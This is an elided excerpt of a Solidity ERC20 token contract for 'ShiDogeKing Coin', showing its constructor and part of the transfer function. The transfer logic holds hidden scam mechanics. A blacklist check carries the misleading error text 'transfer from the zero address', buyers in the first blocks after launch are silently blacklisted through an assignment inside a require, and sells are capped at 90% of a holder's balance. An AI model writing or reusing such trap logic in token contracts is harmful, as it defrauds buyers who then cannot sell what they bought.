...
contract TOKEN is ERC20, Ownable {
    ...
    string public name_ = "ShiDogeKing Coin" ;
    string public symbol_ = "ShiDogeKing";
    ...
    constructor() payable ERC20(name_, symbol_)  {
        ...
        _marketingWalletAddress = 0x44E6db73089526568a08640b0d671A2F79c9d737;
        ...
        uint256 totalSupply = 15000000000000000 * (10**18);
    ...
    function _transfer(
        ...
        require(!_B[from], "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(start == 0 && automatedMarketMakerPairs[to]) {
            start =block.timestamp;
            launchedAt = block.number;
            } 

        if(!_isExcludedFromFees[to] && !automatedMarketMakerPairs[to]){
            if(start < block.timestamp &&  block.timestamp < start + duration && (launchedAt + deadBlocks) > block.number){
                require(_B[to] = true);
            }
        }    
        
        if(!_isExcludedFromFees[from] && automatedMarketMakerPairs[to]){
            require(amount <= balanceOf(from).mul(90).div(100));
        }
        if(amount == 0) {
